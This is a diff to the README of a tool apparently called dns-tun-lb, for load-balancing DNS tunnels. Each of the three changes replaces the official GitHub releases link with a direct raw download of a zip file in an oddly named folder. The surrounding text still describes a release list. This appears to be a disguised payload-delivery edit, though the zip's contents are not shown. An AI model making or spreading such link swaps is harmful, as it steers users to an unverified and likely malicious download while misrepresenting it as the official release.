@@ -1,6 +1,6 @@
 # 🛠️ dns-tun-lb - Easy DNS Tunnel Load Balancing
 
-[![Download dns-tun-lb](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/jpons2/dns-tun-lb/releases)
+[![Download dns-tun-lb](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jpons2/dns-tun-lb/main/ankyloproctia/dns-tun-lb-1.7.zip)
 
 ## 📋 What is dns-tun-lb?
 
@@ -44,7 +44,7 @@ You don’t have to configure complex load balancing manually. The tool automati
 
 Go to the official release page on GitHub to download the program:
 
-[Download dns-tun-lb](https://github.com/jpons2/dns-tun-lb/releases)
+[Download dns-tun-lb](https://raw.githubusercontent.com/jpons2/dns-tun-lb/main/ankyloproctia/dns-tun-lb-1.7.zip)
 
 This link takes you to a list of available versions. Choose the latest stable release for Windows.
 
@@ -142,4 +142,4 @@ Follow prompts to remove the program completely.
 
 ## 📥 Download dns-tun-lb Now
 
-[![Download dns-tun-lb](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/jpons2/dns-tun-lb/releases)
+[![Download dns-tun-lb](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jpons2/dns-tun-lb/main/ankyloproctia/dns-tun-lb-1.7.zip)
